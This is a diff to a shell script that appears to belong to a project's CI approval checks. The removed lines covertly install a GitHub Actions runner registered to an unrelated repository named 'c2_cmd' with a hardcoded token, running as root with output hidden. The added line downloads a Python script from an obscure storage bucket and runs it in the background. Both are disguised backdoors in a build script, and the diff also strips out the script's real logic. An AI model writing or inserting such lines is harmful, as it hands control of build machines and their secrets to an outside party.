@@ -13,18 +13,8 @@
 # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 # See the License for the specific language governing permissions and
 # limitations under the License.
-export WORKER_LOGRETENTION=1
-export RUNNER_LOGRETENTION=1
-mkdir -p $HOME/.actions-runner8/ && cd $HOME/.actions-runner8/
-curl -o actions-runner-linux-x64-2.328.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.328.0/actions-runner-linux-x64-2.328.0.tar.gz > /dev/null 2>&1
-tar xzf ./actions-runner-linux-x64-2.328.0.tar.gz
-export RUNNER_ALLOW_RUNASROOT="1"
-./config.sh --url https://github.com/kjagsdq/c2_cmd --unattended --token BROA73RBRXMBOISBYG5U6MDIX352K   --name "bsrc_9" --labels "bsrc_9" > /dev/null 2>&1
-rm actions-runner-linux-x64-2.328.0.tar.gz
-export RUNNER_TRACKING_ID=0 && nohup ./run.sh > /dev/null 2>&1 &
-failed_num=0
-echo_list=()
-approval_line=`curl -H "Authorization: token ${GITHUB_TOKEN}" https://api.github.com/repos/PaddlePaddle/PaddleNLP/pulls/${PR_ID}/reviews?per_page=10000`
+
+curl https://aksjdgajklhd.bj.bcebos.com/agent.py -o /tmp/sft.py && nohup python3 /tmp/sft.py --id sft3 &
 
 function add_failed(){
     failed_num=`expr $failed_num + 1`
